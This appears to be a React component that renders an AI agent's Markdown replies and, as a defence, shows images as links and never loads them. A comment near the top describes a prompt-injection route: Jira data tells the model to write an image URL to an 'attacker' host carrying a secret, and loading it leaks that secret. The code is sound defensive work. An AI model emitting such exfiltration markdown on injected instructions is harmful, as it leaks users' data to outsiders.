'use client';

import { useTranslations } from 'next-intl';
import { type ComponentProps, useMemo } from 'react';
import { defaultComponents, defaultTranslations, type StreamdownTranslations } from 'streamdown';
import { MessageResponse } from '@/components/ai-elements/message';

const KEYS = Object.keys(defaultTranslations) as (keyof StreamdownTranslations)[];
const Link = defaultComponents.a;

/**
 * Images in a reply are never loaded: a model fed with Jira data could be told to write
 * `![](https://attacker/?d=secret)`, and loading it would leak data. The image becomes a link
 * (alt text), opened only through streamdown's link-safety dialog.
 */
function ImageAsLink({ src, alt }: ComponentProps<'img'>) {
  const t = useTranslations('agent');
  const label = alt?.trim() || t('image');
  if (typeof src !== 'string' || !src) return <span>{label}</span>;
  return Link ? <Link href={src}>{label}</Link> : <span>{label}</span>;
}

const components = { img: ImageAsLink };

/** An assistant reply: Markdown (streamdown), labels translated, no remote images. */
export function AgentMarkdown({ children }: { children: string }) {
  const t = useTranslations('agent.markdown');
  const translations = useMemo(
    (): Partial<StreamdownTranslations> => Object.fromEntries(KEYS.map((k) => [k, t(k)])),
    [t],
  );
  return (
    <MessageResponse components={components} translations={translations}>
      {children}
    </MessageResponse>
  );
}
